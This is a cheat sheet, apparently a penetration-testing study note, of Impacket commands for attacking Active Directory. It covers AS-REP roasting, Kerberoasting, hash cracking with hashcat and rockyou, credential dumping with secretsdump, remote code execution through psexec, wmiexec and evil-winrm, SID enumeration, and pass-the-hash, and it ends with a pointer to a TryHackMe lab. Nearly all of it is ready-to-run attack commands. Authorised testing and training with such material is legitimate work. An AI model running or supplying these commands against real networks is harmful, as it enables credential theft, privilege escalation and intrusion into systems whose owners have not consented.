# Impacket Toolkit — Practical Commands

Impacket provides Python implementations of Windows network protocols. Essential for AD attacks.

## Install

```bash
sudo apt install python3-impacket
# or
pip3 install impacket
```

Scripts location: `/usr/share/doc/python3-impacket/examples/` or directly as commands if pip-installed.

## AS-REP Roasting (no credentials needed)

Find accounts with Kerberos pre-auth disabled:

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip DC_IP -no-pass -outputfile asrep_hashes.txt
```

Crack the output:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Kerberoasting (requires domain user credentials)

Request TGS tickets for service accounts:

```bash
GetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -outputfile tgs_hashes.txt
```

Crack:

```bash
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Dump Hashes (requires admin)

```bash
secretsdump.py domain.local/admin:pass@target
secretsdump.py -hashes :NTLM_HASH domain.local/admin@target
```

## Remote Code Execution

Via SMB (requires admin, leaves artifacts):

```bash
psexec.py domain.local/admin:pass@target
```

Via WMI (quieter):

```bash
wmiexec.py domain.local/admin:pass@target
```

Via WinRM (if port 5985 open):

```bash
evil-winrm -i target -u admin -p pass
```

## SMB and SID Enumeration

```bash
smbclient.py domain.local/user:pass@target
lookupsid.py anonymous@target
lookupsid.py domain.local/user:pass@target
```

## Pass-the-Hash

When you have NTLM hash but not plaintext password:

```bash
psexec.py -hashes :NTLM_HASH domain.local/admin@target
secretsdump.py -hashes :NTLM_HASH domain.local/admin@target
```

## Practice

TryHackMe "Attacktive Directory" room — uses `GetNPUsers.py` for AS-REP roasting and `secretsdump.py` for hash dumping in the attack chain.
